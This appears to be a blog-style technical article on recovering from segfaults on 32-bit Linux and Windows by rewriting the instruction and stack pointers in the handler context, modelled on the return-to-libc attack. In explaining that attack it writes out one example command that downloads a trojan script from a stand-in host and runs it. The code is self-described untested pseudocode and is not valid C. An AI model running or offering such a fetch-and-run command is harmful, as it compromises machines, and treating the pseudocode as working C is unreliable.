Cleanly recovering from Segfaults under Windows and Linux (32-bit)
## two brief notes

First. Windows calls 'em access violations, Linux calls 'em segfaults. I'm a linux person, so I'll
go with segfaults. They're the same thing though.

Second. My code may look like C, but since it's ported from a decidedly not-C language and
I didn't actually test it to see if it compiles, you should treat it like pseudocode.
Caveat lexor. (look ma I'm classy)

## the problem

Segfault crashes are annoying. Most exceptions can be caught, but segfaults are the archetypal
instant/total crash. Ways of handling them tend to rely on system-specific methods and have their
own idiosyncracies. In this article I'm gonna outline how to recover from segfaults under Linux
(probably at least some other POSIX systems as well) as well as Windows (32-bit each). Interestingly,
the approach is quite similar, and should generalize to 64-bit systems with minor prodding assuming
you're familiar with the 64-bit version of cdecl.

## the basic idea

Both Windows and Linux let you define handler functions that are executed when a segfault occurs.
In theory we could throw an exception right from the handler, but this is **highly iffy**
because the operating system treats "the state of being in a handler function" as special.
We can't return from the handler function either, because that'll just bring us back to the
crash site. Instead, we need to take a page out of the Black Hat Book.

## return-to-libc

Almost all exploits are concerned primarily with getting the target computer to execute arbitrary
code. Buffer overflows let you overwrite variables, but they usually don't let you change _code_,
because assembler code does not live on the stack. There's a trick to bypass this, though,
and it's called the return-to-libc attack.

Basically, it would be enough if we could call one C library function with arbitrary arguments.
For instance, the function could be system() and the argument could be
`wget http://crackedserver.cc/trojan.sh && sh -c trojan.sh`. But we can't change code, so
we cannot insert a call instruction, even with a buffer overflow.

We can, however, reuse a call instruction that's already there.

Did you know that the "ret" instruction works like a jump that takes its address from the stack?

The way function calls work is, the "call" instruction pushes the next instruction address
after the "call" onto the stack (in most cases, the same stack as used for static buffers
, although some rare architectures have dedicated instruction stacks [and thus
are immune to this attack]), then executes a jump to the target function. Symmetrically,
the "ret"[urn] instruction simply pops an address from the stack and jumps to it.

Knowing this, our attack is simple: use a buffer overflow to overwrite the return address of the
current function with `&system`, and provide the appropriate arguments for it. This is made easier
by the fact that for historical reasons, most stacks grow _downwards_, as opposed to static buffers
on the stack, which naturally grow upwards.

We are going to make use of a similar approach.

## applying this to segfault recovery

We want the segfault handler to execute arbitrary code without being limited to what the OS
deems "safe" for handlers. For that, we need to execute a jump to the address of our userspace
(non-handler) handler function. But we can't rewrite the callsite.

We _can_ rewrite the stack. And we have one "ret" instruction available.

On both Windows and Linux, the segfault handler function is passed a "context struct", which
includes the state of the registers at the failure site. Ostensibly, this is so people can
repair the problem that caused the segfault (it also lets you do nifty things like userspace
segment handling). However, what we're going to do is to set up an imitation of the effects
of a call instruction on the stack (`push ip`), then rewrite the instruction pointer in that struct
and let the operating system's return to user code do the work for us - instead of returning to the
failing code, it's going to return to a handler function.

Enough talk. Bring the code!

## the code

### linux

    #include "signal.h"
    void seghandle_userspace() {
      // note: because we set up a proper stackframe,
      // unwinding is safe from here.
      // also, by the time this function runs, the
      // operating system is "done" with the signal.
      
      // choose language-appropriate throw instruction
      // raise new MemoryAccessError "Segmentation Fault";
      // throw new MemoryAccessException;
      // longjmp(erroneous_exit);
      // asm { int 3; }
      *(int*) NULL = 0;
    }
    enum X86Registers {
      GS, FS, ES, DS, EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX,
      TRAPNO, ERR, EIP, CS, EFL, UESP, SS
    }
    void seghandle(int sig, void* si, void* unused) {
      ucontext_t* uc = (ucontext_t*) unused;
      // No. I refuse to use triple-pointers.
      // Just pretend ref a = v; is V* ap = &v;
      // and then substitute a with (*ap).
      ref gregs = uc->uc_mcontext.gregs;
      ref eip = (void*) gregs[X86Registers.EIP],
      ref esp = (void**) gregs[X86Registers.ESP];
      
      // imitate the effects of "call seghandle_userspace"
      esp --; // decrement stackpointer.
              // remember: stack grows down!
      *esp = eip;
      
      // set up OS for call via return, like in the attack
      eip = (void*) &seghandle_userspace;
    }
    void setup_segfault_handler() {
      struct sigaction sa;
      sa.flags = SA_SIGINFO;
      sigemptyset (&sa.mask);
      sa.sigaction = &seghandle;
      if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        fprintf(stderr, "failed to setup SIGSEGV handler\n");
        exit(1);
      }
    }

So on SIGSEGV, `seghandle` is called (as a signal handler), rewrites the signal's instruction address
to `seghandle_userspace`, then returns to the OS, which in returning to user code jumps to
`seghandle_userspace`, which then throws an exception or does whatever else it likes.

### windows

Under Windows, this is slightly more involved. (Of course it is. Have you seen the size of a
typical winapi function as compared to POSIX?)

What surprised me though, was how similar the approach is under Windows. The Linux approach can almost
be copied 1:1.

Big credit goes to Matt Pietrek and the highly valuable [crash course on the Depths of Win32™
SEH](http://www.microsoft.com/msj/0197/exception/exception.aspx).

Basically, Windows uses SEH (Structured Exception Handling) to cope with critical errors.
You've seen SEH before - the default SEH handler is the "This application has stopped working"
pop-up.
SEH handlers are tracked with a linked list stored in `FS[0]`. This is
the one part where you may need some assembler, or use your compiler's built-in primitives
(`_try`/`_except`) where provided. I'm going to assume that `_try`/`_except` is not available.

Okay. When a SEH error happens under Windows, the operating system grabs the list of handlers
from `FS[0]`, then queries them in order to see if any of them will handle the error. Handlers
have the choice to say "keep looking", "return to user code" or "invoke exception handler".

A useful note: if we pass over an exception and let the operating system handle it, it will call
our handler again with EH_UNWINDING set. Since the other parameters will be unchanged,
and the function probably won't try to suddenly handle an exception it just passed over,
this mostly need not concern us.

The code!

      #include "winbase.h"
      #include "windows.h"
      #include "excpt.h"
      void seghandle_userspace() {
        // see above re. what to do now
        *(int*) NULL = 0;
      }
      EXCEPTION_DISPOSITION seghandle
      (_EXCEPTION_RECORD* record, void* establisher_frame,
       _CONTEXT* context, void* dispatcher_context
      ) {
        // see above
        ref
          esp = (void**)context.Esp,
          eip = (void* )context.Eip;
        // imitate the effects of "call seghandle_userspace"
        // stack grows down under windows, too
        esp --;
        *esp = eip;
        // rewrite eip for return-to-lib, same as linux
        eip = (void*) &seghandle_userspace;
        // and back to user code.
        return ExceptionContinueExecution;
      }
      void setup_segfault_handler() {
        _EXCEPTION_REGISTRATION reg;
        // Note: this bit will require assembly.
        // Consult your compiler vendor documentation.
        reg.prev = FS[0];
        reg.handler = &seghandle;
        FS[0] = &reg;
        // note: do this on exit
        // fs[0] = ((_EXCEPTION_REGISTRATION) fs[0]).prev;
      }
